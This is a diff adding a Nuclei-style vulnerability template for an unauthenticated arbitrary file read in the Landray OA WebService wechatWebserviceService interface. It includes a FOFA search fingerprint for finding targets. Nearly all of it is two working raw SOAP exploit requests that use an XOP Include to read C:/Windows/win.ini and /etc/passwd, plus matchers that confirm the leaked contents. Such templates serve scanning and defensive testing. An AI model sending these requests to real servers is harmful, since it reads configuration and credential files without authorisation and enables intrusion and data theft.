@@ -1,0 +1,89 @@
+id: Landray-WebService-wechatWebserviceService-File-reading
+
+info:
+  name: "蓝凌OA WebService wechatWebserviceService 任意文件读取漏洞"
+  author: Unknown
+  severity: high
+  description: |-
+    fofa: body="Com_Parameter"
+      蓝凌OA WebService组件的wechatWebserviceService接口存在文件读取漏洞。攻击者无需身份验证即可通过构造特定请求路径，读取服务器端任意敏感文件内容，包括数据库连接配置文件、系统核心配置文件等关键资源。该漏洞允许远程获取系统凭据和架构信息，可能直接导致业务数据泄露及系统权限被控制。
+  reference:
+  - https://mp.weixin.qq.com/s/lna98klfepNrD1F727blvQ?token=1066715859&lang=zh_CN
+  tags: 蓝凌OA
+
+
+http:
+- raw:
+  - |
+    POST /sys/webservice/wechatWebserviceService HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.3319.102 Safari/537.36
+    Connection: close
+    Content-Type: multipart/related; boundary=----4upt9dwdca8rtwq9osuz
+    SOAPAction: ""
+    Accept-Encoding: gzip, deflate
+
+    ------4upt9dwdca8rtwq9osuz
+    Content-Disposition: form-data; name="a"
+
+    <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="http://service.wechat.third.kmss.landray.com/">
+    <soapenv:Header/>
+    <soapenv:Body>
+        <web:getAttachement>
+            <arg0>
+                <beginTimeStamp>a</beginTimeStamp>
+                <count><xop:Include xmlns:xop="http://www.w3.org/2004/08/xop/include" href="file:///C:/Windows/win.ini"/></count>
+            </arg0>
+        </web:getAttachement>
+    </soapenv:Body>
+    </soapenv:Envelope>
+    ------4upt9dwdca8rtwq9osuz--
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - 'OyBmb3IgMTYtYml0IGFwcCBzdXBwb3J0'
+    - 'Unmarshalling Error: 意外的文本'
+    condition: and
+  - type: status
+    status:
+    - 500
+- raw:
+  - |
+    POST /sys/webservice/wechatWebserviceService HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.3319.102 Safari/537.36
+    Connection: close
+    Content-Type: multipart/related; boundary=----4upt9dwdca8rtwq9osuz
+    SOAPAction: ""
+    Accept-Encoding: gzip, deflate
+
+    ------4upt9dwdca8rtwq9osuz
+    Content-Disposition: form-data; name="a"
+
+    <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="http://service.wechat.third.kmss.landray.com/">
+    <soapenv:Header/>
+    <soapenv:Body>
+        <web:getAttachement>
+            <arg0>
+                <beginTimeStamp>a</beginTimeStamp>
+                <count><xop:Include xmlns:xop="http://www.w3.org/2004/08/xop/include" href="file:///etc/passwd"/></count>
+            </arg0>
+        </web:getAttachement>
+    </soapenv:Body>
+    </soapenv:Envelope>
+    ------4upt9dwdca8rtwq9osuz--
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - 'cm9vdDov'
+    - 'L2Jpbi9iYXNo'
+    - 'Unmarshalling Error: 意外的文本'
+    condition: and
+  - type: status
+    status:
+    - 500
+
